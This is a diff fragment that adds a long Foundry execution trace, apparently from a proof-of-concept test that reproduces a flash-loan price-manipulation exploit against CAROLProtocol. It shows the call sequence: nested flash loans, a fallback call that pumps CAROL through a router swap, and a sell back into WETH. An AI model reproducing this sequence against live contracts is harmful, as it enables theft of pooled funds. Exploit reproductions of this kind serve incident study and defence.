+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0x000000000000000000000000000000000000000000000002608092c429d67718 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [55] CAROLProtocol::fallback{value: 43847207343292315416}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 10843125270688648356602531 [1.084e25], 43847207343292315416 [4.384e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [58503] Router::swapExactETHForTokens{value: 43847207343292315416}(0, [0x4200000000000000000000000000000000000006, 0x4A0a76645941d8C7ba059940B3446228F0DB8972], CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701348945 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 13892257479495131099 [1.389e19], 3435463676476788204938872 [3.435e24], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21802] WETH::deposit{value: 43847207343292315416}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], wad: 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0 → 0x000000000000000000000000000000000000000000000002608092c429d67718
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3001] WETH::transfer(0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0x000000000000000000000000000000000000000000000002608092c429d67718 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000000c0cb3692c1921fdb → 0x000000000000000000000000000000000000000000000003214bc956eb6896f3
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16725] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::swap(0, 2607310408656537245362820 [2.607e24], CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3510] CAROL::transfer(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 2607310408656537245362820 [2.607e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 2607310408656537245362820 [2.607e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x00000000000000000000000000000000000000000002d77cdbec70fbee7ca678 → 0x00000000000000000000000000000000000000000000af5e4752ba74825dfbf4
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x000000000000000000000000000000000000000000255ff98e7c5173fa78aed7 → 0x000000000000000000000000000000000000000000278818231607fb6697595b
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 57739464822787446515 [5.773e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 828153267820250959576052 [8.281e23]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 57739464822787446515 [5.773e19], reserve1: 828153267820250959576052 [8.281e23])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0In: 43847207343292315416 [4.384e19], amount1In: 0, amount0Out: 0, amount1Out: 2607310408656537245362820 [2.607e24], to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x6568852500000002d77cdbec70fbee7ca678000000000000c0cb3692c1921fdb → 0x6568852500000000af5e4752ba74825dfbf4000000000003214bc956eb6896f3
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [43847207343292315416 [4.384e19], 2607310408656537245362820 [2.607e24]]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sell(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 2927235194430644552183 [2.927e21], param2: 41792348115915993917 [4.179e19], param3: 1701348645 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe4b: 0 → 0x00000000000000000000000000000000000000000000009eaf8c842d8c1401f7
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe4a: 0x0000000000000000000000000000000000000000000000000000000065677ee3 → 0x0000000000000000000000000000000000000000000000000000000065688525
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc9d: 0x0000000000000000000000000000000000000000000000000000000065677ee3 → 0x0000000000000000000000000000000000000000000000000000000065688525
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1559712600640968914102731 [1.559e24]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [30777] Router::swapExactTokensForTokens(1559712600640968914102731 [1.559e24], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 57739464822787446515 [5.773e19], 828153267820250959576052 [8.281e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3992] CAROL::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 1559712600640968914102731 [1.559e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 1559712600640968914102731 [1.559e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x00000000000000000000000000000000000000000000af5e4752ba74825dfbf4 → 0x00000000000000000000000000000000000000000001f9a677d605e43689e5bf
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000014a4830834b6fb42be9cb → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [16216] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::swap(37681664207315214473 [3.768e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3001] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37681664207315214473 [3.768e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 37681664207315214473 [3.768e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000003214bc956eb6896f3 → 0x000000000000000000000000000000000000000000000001165b9f6394d5766a
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000b5ba2516ad91e66ea0 → 0x0000000000000000000000000000000000000000000000b7c51540a0e8798f29
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 20057800615472232042 [2.005e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2387865868461219873678783 [2.387e24]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 20057800615472232042 [2.005e19], reserve1: 2387865868461219873678783 [2.387e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0In: 0, amount1In: 1559712600640968914102731 [1.559e24], amount0Out: 37681664207315214473 [3.768e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x6568852500000000af5e4752ba74825dfbf4000000000003214bc956eb6896f3 → 0x6568852500000001f9a677d605e43689e5bf000000000001165b9f6394d5766a
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [1559712600640968914102731 [1.559e24], 37681664207315214473 [3.768e19]]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1902] WETH::deposit{value: 41793348115915993917}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 41793348115915993917 [4.179e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000b7c51540a0e8798f29 → 0x0000000000000000000000000000000000000000000000ba09150d4f2fe38266
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3001] WETH::transfer(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], 622657293773920288443 [6.226e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], value: 622657293773920288443 [6.226e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc93772cfdf83c0f79f83c7206cf8109722a0e3b1bd40e76acb3b284626ac2c81: 0x00000000000000000000000000000000000000000000009a9b6a4d2b83d843dd → 0x0000000000000000000000000000000000000000000000bc5c8562e0ac688298
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000ba09150d4f2fe38266 → 0x00000000000000000000000000000000000000000000009847f9f79a075343ab
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3474654729397892317848 [3.474e21]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [3045] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 7061557323715 [7.061e12]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 7061557323715 [7.061e12]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [4854] 0x420DD381b31aEf6683db6B902084cB0FFECe40Da::getFee(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], false) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000001e
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [7801] WETH::transfer(0x8EfE209dd8868Ed7C9946761b17A8BE6A77Ade7C, 1867971881321760865 [1.867e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], to: 0x8EfE209dd8868Ed7C9946761b17A8BE6A77Ade7C, value: 1867971881321760865 [1.867e18])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc93772cfdf83c0f79f83c7206cf8109722a0e3b1bd40e76acb3b284626ac2c81: 0x0000000000000000000000000000000000000000000000bc5c8562e0ac688298 → 0x0000000000000000000000000000000000000000000000bc4299045937ce7a37
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x59ec71b15c01aac728d42f15b119c3a64143a019d2a6dd9f7b4c7e540ec04e17: 0x0000000000000000000000000000000000000000000000002032ab9ad8de00ca → 0x0000000000000000000000000000000000000000000000003a1f0a224d78092b
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Fees(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1867971881321760865 [1.867e18], param2: 0)
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3472786757516570556983 [3.472e21]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1045] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 7061557323715 [7.061e12]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 7061557323715 [7.061e12]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 3472786757516570556983 [3.472e21], reserve1: 7061557323715 [7.061e12])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 622657293773920288443 [6.226e20], param3: 0, param4: 620745058598125910711 [6.207e20], param5: 0)
+    │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x31ecc21a745e3968a04e9570e4425bc18fa8019c68028196b546d1669c203d03: 0 → 0x00000000000000000000000000000000000000000000000511c258a1f489ec98
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 22: 0x0000000000000000000000000000000000000000000000000000000065677e95 → 0x0000000000000000000000000000000000000000000000000000000065688525
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x31ecc21a745e3968a04e9570e4425bc18fa8019c68028196b546d1669c203d02: 0 → 0x0000000000000000000000000000000000000000b2d7ab2c5ce5252ee6d903d6
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 20: 0x0000000000000000000000000000000000000000000000bc41fbc31de02d7e94 → 0x0000000000000000000000000000000000000000000000bc4299045937ce7a37
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 17: 4147 → 4148
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 23: 0x0000000000000000000000000000000000000000b21695bf9596d0f23db65896 → 0x0000000000000000000000000000000000000000b2d7ab2c5ce5252ee6d903d6
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x31ecc21a745e3968a04e9570e4425bc18fa8019c68028196b546d1669c203d01: 0 → 0x0000000000000000000000000000000000000000000000000000000065688525
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 24: 0x0000000000000000000000000000000000000000000000050b2c0d4d7229fce8 → 0x00000000000000000000000000000000000000000000000511c258a1f489ec98
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 25: 0x00000000000000000000000000000000000000000000000db7adc567123b4278 → 0x00000000000000000000000000000000000000000000000e5d3839d12a91cd55
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   ├─ [3001] WETH::transfer(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18], 339417286401008832265 [3.394e20])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18], value: 339417286401008832265 [3.394e20])
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0xfa61d2f40d051e8dd57e20114f1225baf887f01db04f4c593282c488891cddc2: 0 → 0x000000000000000000000000000000000000000000000012665c6fabff278f09
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000009847f9f79a075343ab → 0x000000000000000000000000000000000000000000000085e19d87ee082bb4a2
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 339417286401008832265 [3.394e20]
+    │   │   │   │   │   │   │   │   ├─ [1045] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1162130361162 [1.162e12]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1162130361162 [1.162e12]
+    │   │   │   │   │   │   │   │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 339247662569723970279 [3.392e20], amount1: 0, paid0: 169623831284861986 [1.696e17], paid1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 1: 0x000000000000000000000000000000a37eb3c3d634eaa5e97cceefe7fe4bf93e → 0x000000000000000000000000000000a3d5cf678da39b546847076efd49c58690
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ [3001] WETH::transfer(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17], 323763704678691242275 [3.237e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17], value: 323763704678691242275 [3.237e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xcb5f509312985b15d8d664d057cc1fa800b361b5a6c874c23961b64a976935c7: 0 → 0x0000000000000000000000000000000000000000000000118d1fbe0819de0123
+    │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000085e19d87ee082bb4a2 → 0x000000000000000000000000000000000000000000000074547dc9e5ee4db37f
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [1045] 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [559] 0x1833C6171E0A3389B156eAedB301CFfbf328B463::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 671024918530 [6.71e11]
+    │   │   │   │   │   │   │   └─ ← [Return] 671024918530 [6.71e11]
+    │   │   │   │   │   │   ├─ [457] WETH::balanceOf(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 323763704678691242275 [3.237e20]
+    │   │   │   │   │   │   ├─ [2327] 0x5b15FC22233315d4f4064a00268e5eFc95795A23::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14703274077976679431066 [1.47e22]
+    │   │   │   │   │   │   ├─ [327] 0x5b15FC22233315d4f4064a00268e5eFc95795A23::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14703274077976679431066 [1.47e22]
+    │   │   │   │   │   │   ├─ emit TweakPrice(: 1937944511386417840035 [1.937e21], : 1298077114486997390962360 [1.298e24], : 1002734080524938707 [1.002e18], : 1003405876932642752 [1.003e18])
+    │   │   │   │   │   │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: [0, 323601903726827828360 [3.236e20]], param2: [0, 161800951863413915 [1.618e17]])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000006e998c1725d0aa0fb0 → 0x00000000000000000000000000000000000000000000006e8a3bc0397edb0180
